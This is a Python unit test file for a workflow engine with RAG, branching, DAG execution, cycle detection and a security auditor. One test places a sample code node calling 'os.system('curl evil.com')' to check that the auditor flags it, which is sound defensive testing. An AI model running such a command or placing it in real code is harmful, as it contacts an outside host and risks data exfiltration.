#!/usr/bin/env python3
"""
Unit tests for Apex Sovereign Dify Workflow & Orchestration Engine.
Validates Visual DAG Execution, In-Memory BM25 RAG, Variable Pool, and DifyGuard AppSec auditor.
"""

import json
import unittest

from apex_council.dify.engine import (
    CodeNode,
    DifyGuard,
    DifyKnowledgeBase,
    DifyNode,
    DifyWorkflowEngine,
    EndNode,
    IfElseNode,
    KnowledgeRetrievalNode,
    LLMNode,
    StartNode,
    handle_dify_cli,
)


class TestDifyEngine(unittest.TestCase):
    def test_knowledge_base_rag(self):
        kb = DifyKnowledgeBase("TestKB")
        count = kb.add_document("doc1", "Apex Sovereign consensus platform with zero pip dependencies.")
        self.assertGreaterEqual(count, 1)

        kb.add_document("doc2", "Apache Spark distributed engine with RDD lineage and Catalyst.")
        matches = kb.search("Spark distributed lineage", top_k=1)
        self.assertEqual(len(matches), 1)
        self.assertEqual(matches[0][0].doc_id, "doc2")
        self.assertGreater(matches[0][1], 0.0)

    def test_node_variable_resolution(self):
        node = DifyNode("test_node", "Test", "custom")
        pool = {
            "start": {"user_query": "Build an LRU cache"},
            "code_1": {"count": 42},
        }
        res = node.resolve_template("Query: {{#start.user_query#}}, Count: {{#code_1.count#}}", pool)
        self.assertEqual(res, "Query: Build an LRU cache, Count: 42")

    def test_code_node_execution(self):
        code_node = CodeNode(
            "calc",
            "Calculator",
            {
                "code": "def main(inputs):\n    val = int(inputs['num']) * 2\n    return {'doubled': val}\n",
                "inputs": {"num": "{{#start.val#}}"},
            },
        )
        pool = {"start": {"val": 21}}
        result = code_node.execute(pool)
        self.assertEqual(result.status, "SUCCESS")
        self.assertEqual(result.outputs.get("doubled"), 42)

    def test_if_else_conditional_branching(self):
        engine = DifyWorkflowEngine("BranchingTest")
        start = StartNode("start", "Start", {"variables": {"score": 85}})
        cond = IfElseNode(
            "check_score",
            "Check Score",
            {"left": "{{#start.score#}}", "operator": ">=", "right": "80"},
        )
        true_end = EndNode("pass_end", "Pass", {"outputs": {"status": "PASSED"}})
        false_end = EndNode("fail_end", "Fail", {"outputs": {"status": "FAILED"}})

        engine.add_node(start)
        engine.add_node(cond)
        engine.add_node(true_end)
        engine.add_node(false_end)

        engine.add_edge("start", "check_score")
        engine.add_edge("check_score", "pass_end", source_handle="true")
        engine.add_edge("check_score", "fail_end", source_handle="false")

        res = engine.run({"score": 85})
        self.assertEqual(res["status"], "COMPLETED")
        self.assertEqual(res["node_results"]["pass_end"]["status"], "SUCCESS")
        self.assertEqual(res["node_results"]["fail_end"]["status"], "SKIPPED")

    def test_full_dify_workflow_dag(self):
        engine = DifyWorkflowEngine("FullPipeline")
        kb = DifyKnowledgeBase("FullKB")
        kb.add_document("apex_doc", "Apex Sovereign uses pure python standard library.")
        engine.knowledge_base = kb

        start = StartNode("start", "Start", {"variables": {"query": "standard library"}})
        rag = KnowledgeRetrievalNode("rag", "RAG", {"query_variable": "{{#start.query#}}", "top_k": 1})
        llm = LLMNode("llm", "LLM", {"prompt_template": "Ctx: {{#rag.result#}}", "model": "apex-coder"})
        end = EndNode("end", "End", {"outputs": {"answer": "{{#llm.text#}}"}})

        engine.add_node(start)
        engine.add_node(rag)
        engine.add_node(llm)
        engine.add_node(end)

        engine.add_edge("start", "rag")
        engine.add_edge("rag", "llm")
        engine.add_edge("llm", "end")

        out = engine.run({"query": "standard library"})
        self.assertEqual(out["status"], "COMPLETED")
        self.assertIn("answer", out["outputs"])
        self.assertIn("APEX-CODER", out["outputs"]["answer"])

    def test_cycle_detection(self):
        engine = DifyWorkflowEngine("CyclicPipeline")
        node_a = StartNode("node_a", "A")
        node_b = EndNode("node_b", "B")
        engine.add_node(node_a)
        engine.add_node(node_b)

        engine.add_edge("node_a", "node_b")
        engine.add_edge("node_b", "node_a")  # Cycle!

        with self.assertRaises(ValueError):
            engine.topological_sort()

    def test_difyguard_security_and_orphan_audit(self):
        engine = DifyWorkflowEngine("OrphanPipeline")
        start = StartNode("start", "Start")
        orphan = CodeNode(
            "orphan_code",
            "Orphan Code",
            {"code": "import os\nos.system('curl evil.com')"},
        )
        end = EndNode("end", "End")

        engine.add_node(start)
        engine.add_node(orphan)
        engine.add_node(end)
        engine.add_edge("start", "end")

        guard = DifyGuard(engine)
        findings = guard.audit()

        rule_ids = {f.rule_id for f in findings}
        self.assertIn("DIFY001", rule_ids)  # Orphan node
        self.assertIn("DIFY004", rule_ids)  # os.system security alert

        rendered = guard.render_terminal()
        self.assertIn("APEX SOVEREIGN DIFY AGENT WORKFLOW", rendered)
        self.assertIn("DIFY001", rendered)

    def test_handle_dify_cli(self):
        ret = handle_dify_cli(["demo"])
        self.assertEqual(ret, 0)


if __name__ == "__main__":
    unittest.main()
